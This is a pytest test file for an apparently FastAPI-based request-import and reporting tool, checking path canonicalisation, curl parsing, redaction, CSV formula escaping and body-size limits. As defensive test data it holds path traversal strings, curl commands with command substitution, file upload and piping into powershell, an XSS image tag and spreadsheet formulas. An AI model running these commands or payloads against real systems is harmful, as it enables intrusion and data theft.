from __future__ import annotations

import csv
import io
import json
from typing import Any

import pytest
from fastapi.testclient import TestClient
from hypothesis import given, settings
from hypothesis import strategies as st

from app.comparison.normalization import normalize_response
from app.main import InputGuard, app
from app.parsers.request_import import (
    RequestImportError,
    canonicalize_path,
    parse_curl,
    parse_raw_http,
)
from app.reporting.generator import csv_safe

client = TestClient(app, base_url="http://localhost", raise_server_exceptions=False)


@pytest.mark.parametrize(
    "path",
    [
        "/%2e%2e/private",
        "/%252e%252e/private",
        "/bad%",
        "/bad%ff",
        "/%5cprivate",
        "//outside",
        "/%00",
    ],
)
def test_preserved_path_validation(path: str) -> None:
    with pytest.raises(RequestImportError):
        canonicalize_path(path)


def test_preserved_raw_and_curl_parser_safeguards() -> None:
    parsed = parse_raw_http(
        "GET /me HTTP/1.1\r\nAuthorization: Bearer fictional\r\nAccept: application/json\r\n\r\n"
    )
    assert parsed.headers == [["Accept", "application/json"]]
    assert parsed.secret_headers == [["Authorization", "Bearer fictional"]]
    for command in (
        "curl https://example.invalid/$(whoami)",
        "curl --data @secrets.txt https://example.invalid/",
        "curl https://example.invalid/ | powershell",
    ):
        with pytest.raises(RequestImportError):
            parse_curl(command)


def test_redaction_and_safe_response_headers() -> None:
    result = normalize_response(
        status_code=200,
        headers=[
            ("Set-Cookie", "session=private"),
            ("Location", "https://user:password@example.invalid/next?token=private#fragment"),
        ],
        body=b'{"password":"private","email":"fictional@example.invalid","safe":"visible"}',
        content_type="application/json",
        max_excerpt_bytes=8000,
        expected_markers=[],
    )
    assert "private" not in (result.excerpt or "")
    assert "fictional@" not in (result.excerpt or "")
    assert result.safe_headers == [["location", "/next"]]
    assert result.structural == {"password": "[REDACTED]", "email": "[REDACTED]", "safe": "visible"}


@pytest.mark.parametrize(
    "formula", ["=1+1", "+1", "-1", "@SUM(1)", "  =1+1", "\t=1+1", "\r=1+1", "\n=1+1"]
)
def test_csv_formula_injection(formula: str) -> None:
    assert csv_safe(formula).startswith("'")


def test_export_injection_and_no_fabricated_report_payload() -> None:
    rows = [
        {
            "principal": "=1+1",
            "resource": "<img src=x onerror=alert(1)>",
            "action": "Read",
            "effect": "allow",
        }
    ]
    before = {"filename": "before.json", "content": json.dumps([{**rows[0], "effect": "deny"}])}
    after = {"filename": "after.json", "content": json.dumps(rows)}
    payload = {"before": before, "after": after}
    pdf = client.post("/api/v1/reports/pdf", json=payload)
    assert pdf.status_code == 200 and pdf.content.startswith(b"%PDF")
    csv_data = client.post("/api/v1/reports/csv", json=payload).content.decode("utf-8-sig")
    assert list(csv.reader(io.StringIO(csv_data)))[1][0] == "'=1+1"
    assert client.post("/api/v1/reports/json", json={**payload, "changes": []}).status_code == 422


async def test_streamed_body_limit_before_app(monkeypatch: pytest.MonkeyPatch) -> None:
    from app.main import settings as api_settings

    monkeypatch.setattr(api_settings, "max_body_bytes", 32)
    called = False
    messages = [
        {"type": "http.request", "body": b"x" * 20, "more_body": True},
        {"type": "http.request", "body": b"x" * 20, "more_body": False},
    ]
    sent: list[dict[str, Any]] = []

    async def next_app(scope: Any, receive: Any, send: Any) -> None:
        nonlocal called
        called = True

    async def receive() -> Any:
        return messages.pop(0)

    async def send(message: Any) -> None:
        sent.append(message)

    scope = {"type": "http", "method": "POST", "headers": [(b"content-type", b"application/json")]}
    await InputGuard(next_app)(scope, receive, send)
    assert not called
    assert sent[0]["status"] == 413


json_values = st.recursive(
    st.none() | st.booleans() | st.integers() | st.text(max_size=30),
    lambda children: st.lists(children, max_size=5)
    | st.dictionaries(st.text(max_size=20), children, max_size=5),
    max_leaves=20,
)


@given(json_values)
@settings(max_examples=80, deadline=None)
def test_untrusted_json_never_crashes_or_exposes_exceptions(value: Any) -> None:
    response = client.post(
        "/api/v1/inspect", json={"filename": "untrusted.json", "content": json.dumps(value)}
    )
    assert response.status_code in {200, 415, 422}
    assert "Traceback" not in response.text
